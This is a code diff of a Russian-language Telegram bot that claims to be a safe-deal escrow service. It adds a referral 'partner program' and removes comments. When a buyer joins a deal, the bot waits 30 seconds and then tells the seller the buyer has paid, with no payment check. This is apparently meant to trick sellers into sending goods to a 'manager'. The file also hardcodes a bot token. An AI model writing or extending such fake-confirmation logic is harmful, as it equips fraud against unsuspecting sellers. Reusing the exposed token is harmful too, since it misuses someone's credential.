@@ -13,7 +13,7 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # ---------- ТВОИ ДАННЫЕ ----------
 TOKEN = "8869240435:AAE0bpAu-73zinTvPiwZeC6cCCs2pJccPyo"
-BOT_USERNAME = "protectionDeals_bot"      # <-- ИСПРАВЛЕНО
+BOT_USERNAME = "protectionDeals_bot"
 MANAGER_USERNAME = "@protectionManager"
 
 bot = Bot(token=TOKEN)
@@ -71,6 +71,7 @@ def main_menu():
         [InlineKeyboardButton(text="💳 Мои реквизиты", callback_data="my_req")],
         [InlineKeyboardButton(text="🤝 Создать сделку", callback_data="create_deal")],
         [InlineKeyboardButton(text="📊 Мои сделки", callback_data="my_deals")],
+        [InlineKeyboardButton(text="👥 Партнёрская программа", callback_data="partner")],
         [InlineKeyboardButton(text="🆘 Поддержка", callback_data="support")]
     ]
     return InlineKeyboardMarkup(inline_keyboard=buttons)
@@ -95,29 +96,23 @@ async def cmd_start(message: types.Message, command: CommandObject):
     cur.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, username))
     conn.commit()
 
-    # Если есть deep-link (подключение к сделке)
     args = command.args
     if args and args.startswith("deal_"):
         deal_id = args.split("_")[1]
         if deal_id.isdigit():
             deal = cur.execute("SELECT * FROM deals WHERE id=?", (int(deal_id),)).fetchone()
-            # deal: (id, seller_id, buyer_id, currency, amount, description, status, deal_code, created_at)
             if deal and deal[6] == 'waiting_buyer' and deal[1] != user_id:
-                # обновляем покупателя
                 cur.execute("UPDATE deals SET buyer_id=?, status='buyer_joined' WHERE id=?",
                             (user_id, int(deal_id)))
                 conn.commit()
-                # генерируем код сделки
                 code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
                 cur.execute("UPDATE deals SET deal_code=? WHERE id=?", (code, int(deal_id)))
                 conn.commit()
-                # уведомляем продавца
                 buyer_name = message.from_user.full_name
                 await bot.send_message(deal[1],
                     f"✅ Покупатель присоединился к сделке #{deal_id}\n"
                     f"👤 {buyer_name} (@{username})\n"
                     f"🔑 Код сделки: {code}")
-                # через 30 секунд запрос на отправку подарка
                 await asyncio.sleep(30)
                 await bot.send_message(deal[1],
                     f"💰 Покупатель оплатил!\n"
@@ -132,8 +127,7 @@ async def cmd_start(message: types.Message, command: CommandObject):
                 await message.answer("❌ Сделка недоступна или уже занята.")
         else:
             await message.answer("❌ Неверная ссылка.")
-                else:
-        # Обычное приветствие
+    else:
         await message.answer(
             "👋 Добро пожаловать в protection!\n\n"
             "✨ Надёжный сервис для безопасных сделок!\n\n"
@@ -155,12 +149,10 @@ async def choose_currency(call: types.CallbackQuery, state: FSMContext):
     currency = call.data.split("_")[1]
     current_state = await state.get_state()
     if current_state is None:
-        # Выбор валюты для реквизитов
         await state.update_data(currency=currency)
         await state.set_state(RequisiteState.waiting_card)
         await call.message.edit_text(f"Введите номер карты для {currency}:", reply_markup=back_to_main_btn())
     else:
-        # Это выбор валюты для сделки (состояние DealState.waiting_currency)
         user_id = call.from_user.id
         req = cur.execute("SELECT * FROM requisites WHERE user_id=? AND currency=?",
                           (user_id, currency)).fetchone()
@@ -210,13 +202,11 @@ async def deal_description(message: types.Message, state: FSMContext):
     description = message.text
     user_id = message.from_user.id
 
-    # Создаём сделку в базе
     cur.execute("INSERT INTO deals (seller_id, currency, amount, description, created_at) VALUES (?, ?, ?, ?, ?)",
                 (user_id, currency, amount, description, datetime.now().isoformat()))
     deal_id = cur.lastrowid
     conn.commit()
 
-    # Формируем ссылку (теперь с правильным юзернеймом)
     link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
     await message.answer(
         f"✅ Сделка успешно создана!\n\n"
@@ -251,6 +241,28 @@ async def my_deals(call: types.CallbackQuery):
         f"💰 Общая сумма: {total:.2f}",
         reply_markup=back_to_main_btn()
     )
+    await call.answer()
+
+# ---------- ПАРТНЁРСКАЯ ПРОГРАММА ----------
+@dp.callback_query(F.data == "partner")
+async def partner_program(call: types.CallbackQuery):
+    user_id = call.from_user.id
+    deals_count = cur.execute(
+        "SELECT COUNT(*) FROM deals WHERE seller_id=? AND status='sent_to_manager'",
+        (user_id,)
+    ).fetchone()[0]
+
+    if deals_count < 5:
+        await call.answer(
+            f"❌ Для подключения партнёрской программы нужно минимум 5 сделок. У вас пока {deals_count}.",
+            show_alert=True
+        )
+    else:
+        await call.message.edit_text(
+            "🎉 Вы подключены к партнёрской программе!\n\n"
+            "Скоро здесь появится информация о ваших рефералах и бонусах.",
+            reply_markup=back_to_main_btn()
+        )
     await call.answer()
 
 # ---------- ПОДДЕРЖКА ----------
